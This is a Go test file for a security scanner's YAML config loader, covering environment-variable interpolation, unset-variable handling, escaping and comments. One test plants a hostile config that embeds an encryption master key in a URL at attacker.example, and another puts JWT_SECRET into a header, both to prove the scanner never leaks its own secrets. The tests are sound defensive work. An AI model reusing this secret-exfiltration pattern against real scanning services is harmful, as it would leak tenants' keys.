package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// The whole point: a credential reaches the scan without being written into a
// committed file.
func TestAValueComesFromTheEnvironment(t *testing.T) {
	t.Setenv("DG_TEST_TOKEN", "s3cr3t-value")

	got, _, err := probe("headers:\n  Authorization: \"Bearer ${DG_TEST_TOKEN}\"\n", OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "Bearer s3cr3t-value") {
		t.Errorf("interpolated to %q", got)
	}
}

// An unset variable must not become an empty string. "Authorization: Bearer "
// is a header that is present, wrong, and indistinguishable from an
// authenticated scan until somebody wonders why everything behind the login
// looks clean.
// An unset variable must never become an empty value in a live setting.
// "Authorization: Bearer " is a header that is present, wrong, and
// indistinguishable from an authenticated scan. The setting is removed instead,
// and the removal is reported.
func TestAnUnsetVariableDropsTheSettingRatherThanEmptyingIt(t *testing.T) {
	os.Unsetenv("DG_TEST_ABSENT")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example
dast:
  headers:
    Authorization: "Bearer ${DG_TEST_ABSENT}"
    X-Tenant: acme
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatalf("one unresolvable setting must not reject the file: %v", err)
	}
	if _, present := cfg.DAST.Headers["Authorization"]; present {
		t.Error("a header whose credential was missing must not be sent at all")
	}
	if cfg.DAST.Headers["X-Tenant"] != "acme" {
		t.Error("the settings that did resolve must survive")
	}
	if len(cfg.Dropped) != 1 || !strings.Contains(cfg.Dropped[0], "Authorization") {
		t.Errorf("dropped = %v; the removed setting must be named", cfg.Dropped)
	}
	if len(cfg.Unresolved) != 1 || cfg.Unresolved[0] != "DG_TEST_ABSENT" {
		t.Errorf("unresolved = %v; the variable must be named", cfg.Unresolved)
	}
	if cfg.DroppedNote() == "" {
		t.Error("the scan must be able to say a setting was dropped")
	}
}

// The whole reason the file is no longer rejected: everything else in it
// survives. Losing the ignore list to a missing DAST credential widened the
// scan and then blocked the gate on the false positives that list suppressed.
func TestAnUnresolvableSettingDoesNotCostTheRestOfTheFile(t *testing.T) {
	os.Unsetenv("DG_TEST_ABSENT")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example
ignore:
  - "**/atlas.sum"
engines:
  trivy:
    enabled: false
dast:
  headers:
    Authorization: "Bearer ${DG_TEST_ABSENT}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Ignore) != 1 {
		t.Error("the ignore list was lost with the unresolvable header")
	}
	if cfg.Engines["trivy"].IsEnabled() {
		t.Error("the engine selection was lost with the unresolvable header")
	}
}

// An empty value is treated as unset, because an exported-but-empty variable is
// the overwhelmingly common shape of "the secret did not make it into CI".
// An exported-but-empty variable is how a secret usually fails to arrive, so it
// counts as unset and takes its setting with it.
func TestAnEmptyVariableIsTreatedAsUnset(t *testing.T) {
	t.Setenv("DG_TEST_EMPTY", "")

	out, missing, err := probe(`x: "${DG_TEST_EMPTY}"`, OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	if !missing["DG_TEST_EMPTY"] {
		t.Error("an exported-but-empty variable should count as unset")
	}
	_ = out

	out, missing, err = probe(`x: "${DG_TEST_EMPTY:-fallback}"`, OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	if len(missing) != 0 {
		t.Errorf("a default should satisfy the reference; missing = %v", missing)
	}
	if !strings.Contains(out, "fallback") {
		t.Errorf("a default should apply to an empty value; got %q", out)
	}
}

func TestADefaultMayItselfBeEmpty(t *testing.T) {
	os.Unsetenv("DG_TEST_OPTIONAL")

	got, missing, err := probe(`x: "${DG_TEST_OPTIONAL:-}"`, OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	if len(missing) != 0 {
		t.Errorf("an explicitly optional value is not missing; got %v", missing)
	}
	if strings.Contains(got, "$") {
		t.Errorf("the reference should be gone; got %q", got)
	}
}

// A config that cannot express its own syntax has a trap in it: an ignore
// pattern or a policy message may legitimately contain "${".
func TestALiteralDollarBraceCanBeWritten(t *testing.T) {
	got, missing, err := probe(`message: "cost is $${NOT_A_VARIABLE}"`, OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	if len(missing) != 0 {
		t.Errorf("an escaped reference must not be resolved; missing = %v", missing)
	}
	if !strings.Contains(got, "${NOT_A_VARIABLE}") {
		t.Errorf("escaped form did not survive; got %q", got)
	}
}

// Every missing variable at once. Finding them one deploy at a time is the
// thing that makes a config change take an afternoon.
// Every missing variable at once. Finding them one deploy at a time is what
// makes a configuration change take an afternoon.
func TestEveryMissingVariableIsNamedTogether(t *testing.T) {
	os.Unsetenv("DG_TEST_A")
	os.Unsetenv("DG_TEST_B")

	_, missing, err := probe("a: ${DG_TEST_A}\nb: ${DG_TEST_B}\n", OSEnv)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"DG_TEST_A", "DG_TEST_B"} {
		if !missing[want] {
			t.Errorf("%s was not recorded as missing; got %v", want, missing)
		}
	}
}

// End to end through the real loader.
func TestACredentialReachesTheConfigWithoutBeingCommitted(t *testing.T) {
	t.Setenv("DG_TEST_DAST_TOKEN", "abc123")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example
dast:
  headers:
    Authorization: "Bearer ${DG_TEST_DAST_TOKEN}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.DAST.Headers["Authorization"]; got != "Bearer abc123" {
		t.Errorf("header = %q, want the interpolated credential", got)
	}

	// The file on disk still holds only the reference.
	onDisk, _ := os.ReadFile(path)
	if strings.Contains(string(onDisk), "abc123") {
		t.Error("the secret was written back to the file")
	}
}

// The vulnerability this parameter exists to close.
//
// The hosted scanner clones a repository it did not write and reads the
// .dragon.yaml inside it. Resolving ${VAR} against its own environment handed
// that repository a read primitive over every secret the scanner holds -- and
// the same file configures where DAST traffic goes, so the two compose into
// exfiltration with no exploit required.
func TestAServerSuppliesTheEnvironmentAndNotTheProcess(t *testing.T) {
	t.Setenv("ENCRYPTION_MASTER_KEY", "the-key-that-decrypts-every-tenant")

	hostile := []byte(`engines:
  zap:
    rules: ["https://attacker.example/${ENCRYPTION_MASTER_KEY}"]
`)

	// The property is that the process environment is never read -- not that
	// the load fails. The value must not appear, whatever happens to the file.
	for name, lookup := range map[string]Lookup{"NoEnv": NoEnv, "nil": nil} {
		out, missing, err := probe(string(hostile), lookup)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if strings.Contains(out, "the-key-that-decrypts-every-tenant") {
			t.Fatalf("%s: the scanner's own environment was read", name)
		}
		if !missing["ENCRYPTION_MASTER_KEY"] {
			t.Errorf("%s: the unresolvable variable was not recorded", name)
		}
	}

	// A scoped source answers only for what it holds.
	scoped := func(name string) (string, bool) {
		if name == "PROJECT_DAST_TOKEN" {
			return "scoped-value", true
		}
		return "", false
	}
	out, _, err := probe(`h: "Bearer ${PROJECT_DAST_TOKEN}"`, scoped)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "scoped-value") {
		t.Errorf("a scoped variable should resolve; got %q", out)
	}
	out, missing, err := probe(`h: "${ENCRYPTION_MASTER_KEY}"`, scoped)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "the-key-that-decrypts-every-tenant") {
		t.Error("a scoped source answered for a variable it does not hold")
	}
	if !missing["ENCRYPTION_MASTER_KEY"] {
		t.Error("the refusal was not recorded")
	}
}

// probe runs the real node walk over a document and reports what came out.
func probe(doc string, lookup Lookup) (string, map[string]bool, error) {
	var n yaml.Node
	if err := yaml.Unmarshal([]byte(doc), &n); err != nil {
		return "", nil, err
	}
	if lookup == nil {
		lookup = NoEnv
	}
	missing := map[string]bool{}
	interpolateNode(&n, lookup, missing)
	out, err := yaml.Marshal(&n)
	return string(out), missing, err
}

// LoadWithEnv is the door the platform uses; it must not reach the process
// environment even when the variable exists there.
func TestLoadWithEnvCannotReachTheProcessEnvironment(t *testing.T) {
	t.Setenv("JWT_SECRET", "leak-me")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: hostile
dast:
  headers:
    X-Data: "${JWT_SECRET}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadWithEnv(path, dir, NoEnv)
	if err != nil {
		t.Fatalf("the file should still load, minus what it could not resolve: %v", err)
	}
	if got := cfg.DAST.Headers["X-Data"]; got != "" {
		t.Fatalf("a repository read the scanner's environment: %q", got)
	}
	if len(cfg.Dropped) == 0 {
		t.Error("the removal must be reported, not silent")
	}

	// The CLI door still works, because there the environment is the caller's.
	cfg, err = Load(path, dir)
	if err != nil {
		t.Fatalf("the command line keeps its behaviour: %v", err)
	}
	if cfg.DAST.Headers["X-Data"] != "leak-me" {
		t.Error("Load should still resolve against the process environment")
	}
}

// Parking configuration behind a # is the most ordinary thing anybody does
// with it. Resolving references over the raw text meant a commented-out block
// still resolved, so a variable nothing was going to read failed the whole
// scan -- and the block could not be commented out to make it stop.
func TestAReferenceInACommentIsNotAReference(t *testing.T) {
	os.Unsetenv("DG_TEST_PARKED")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example

# Parked until the dynamic engines are turned on:
#
# dast:
#   headers:
#     X-API-Key: "${DG_TEST_PARKED}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatalf("a commented-out reference failed the load: %v", err)
	}
	if len(cfg.DAST.Headers) != 0 {
		t.Errorf("a commented block was applied: %v", cfg.DAST.Headers)
	}
}

// A "#" inside a quoted value is not a comment, and a comment-stripping pass
// is exactly what would get that wrong. Walking parsed values cannot.
func TestAHashInsideAValueIsNotAComment(t *testing.T) {
	t.Setenv("DG_TEST_FRAGMENT", "resolved")

	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte(`version: dragonguard/v1
project: example
dast:
  headers:
    X-Note: "value with # a hash and ${DG_TEST_FRAGMENT}"
`), 0o600); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path, dir)
	if err != nil {
		t.Fatal(err)
	}
	got := cfg.DAST.Headers["X-Note"]
	if got != "value with # a hash and resolved" {
		t.Errorf("header = %q; the hash is part of the value and the reference still resolves", got)
	}
}

// A file holding nothing but comments is a valid configuration that sets
// nothing, not a parse failure.
func TestAFileOfOnlyCommentsLoads(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".dragon.yaml")
	if err := os.WriteFile(path, []byte("# nothing here yet\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path, dir); err != nil {
		t.Errorf("a comments-only config failed to load: %v", err)
	}
}
